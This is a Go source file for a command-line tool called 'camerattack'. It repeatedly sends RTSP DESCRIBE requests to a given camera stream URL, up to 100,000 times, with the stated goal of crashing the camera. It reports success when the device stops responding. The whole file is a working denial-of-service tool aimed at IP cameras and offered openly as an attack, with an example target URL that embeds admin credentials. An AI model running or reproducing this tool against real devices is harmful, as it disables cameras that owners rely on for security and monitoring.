package main

import (
	"fmt"
	"os"
	"strconv"
	"strings"
	"time"

	curl "github.com/andelf/go-curl"

	"github.com/fatih/color"
	"github.com/gernest/wow"
	"github.com/gernest/wow/spin"
)

const threads = 8

// HACK: See https://stackoverflow.com/questions/3572397/lib-curl-in-c-disable-printing
func doNotWrite([]uint8, interface{}) bool {
	return true
}

func rtspDescribe(w *wow.Wow, target string, count int64) {
	easy := curl.EasyInit()
	defer easy.Cleanup()
	if easy != nil {
		// Do not send a body in the describe request
		easy.Setopt(curl.OPT_NOBODY, 1)
		// Do not write sdp in stdout
		easy.Setopt(curl.OPT_WRITEFUNCTION, doNotWrite)
		// Send a request to the URL of the stream we want to attack
		easy.Setopt(curl.OPT_URL, target)
		// Set the RTSP STREAM URI as the stream URL
		easy.Setopt(curl.OPT_RTSP_STREAM_URI, target)
		// 2 is CURL_RTSPREQ_DESCRIBE
		easy.Setopt(curl.OPT_RTSP_REQUEST, 2)

		err := easy.Perform()
		if err != nil {
			if strings.Contains(err.Error(), "Couldn't connect to server") {
				red := color.New(color.FgRed, color.Bold).SprintFunc()
				clearOutput(w)
				fmt.Printf("%s Can't access stream %s\n", red("\xE2\x9C\x94"), target)
				os.Exit(1)
			}

			green := color.New(color.FgGreen, color.Bold).SprintFunc()
			clearOutput(w)
			fmt.Printf("%s After %d tries, the camera seems to have crashed.\n", green("\xE2\x9C\x94"), count)
			os.Exit(0)
		}
	}
}

func main() {
	red := color.New(color.FgRed, color.Bold).SprintFunc()

	err := curl.GlobalInit(curl.GLOBAL_ALL)
	if err != nil {
		fmt.Printf(
			"%s curl initialization failed: %v\n",
			red("\xE2\x9C\x96"),
			err,
		)
		os.Exit(1)
	}

	args := os.Args[1:]
	if len(args) == 0 {
		fmt.Printf("usage: camerattack [RTSP URL]\n\texample: `./camerattack rtsp://admin:12345@192.168.1.1:554/live.sdp`\n")
		os.Exit(1)
	}
	w := startSpinner()
	for count := int64(0); count < 100000; count = count + threads {
		updateSpinner(w, "[Attempt #"+strconv.FormatInt(count, 10)+" to #"+strconv.FormatInt(count+8, 10)+"] Attacking RTSP stream...")
		for thread := count; thread < count+threads; thread++ {
			rtspDescribe(w, args[0], thread)
		}
	}
	clearOutput(w)
	fmt.Printf("%s %s\n%s\n%s%s",
		red("\xE2\x9C\x96"),
		"Could not crash camera after 100000 attempts.",
		"You can try to run the program again but it's unlikely that this camera can be remotely shut down.",
		"The reason can be that the network speed and stability between you and the camera is not good enough",
		"to send requests to the camera quick enough.",
	)
}

func updateSpinner(w *wow.Wow, text string) {
	w.Text(" " + text)
}

func startSpinner() *wow.Wow {
	w := wow.New(os.Stdout, spin.Get(spin.Dots), " Starting up...")
	w.Start()
	return w
}

// HACK: Waiting for a fix to issue
// https://github.com/gernest/wow/issues/5
func clearOutput(w *wow.Wow) {
	w.Text("\b")
	time.Sleep(80 * time.Millisecond)
	w.Stop()
}
